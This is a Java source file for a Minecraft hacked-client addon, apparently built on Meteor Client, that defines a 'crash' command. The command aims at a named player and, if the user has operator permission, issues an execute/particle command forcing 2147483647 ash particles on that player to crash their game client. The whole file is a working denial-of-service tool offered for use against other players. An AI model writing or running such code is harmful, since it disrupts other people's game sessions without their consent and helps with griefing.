package pwn.noobs.trouserstreak.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.text.Text;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "Crash players, requires permission level 2 or higher");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if(mc.player.hasPermissionLevel(2)) ChatUtils.sendPlayerMsg("/execute at " + profile.getName() + " run particle ash ~ ~ ~ 1 1 1 1 2147483647 force " + profile.getName());
            ChatUtils.sendMsg(Text.of("Crashing player: "+profile.getName()));
            return SINGLE_SUCCESS;
        }));
    }
}
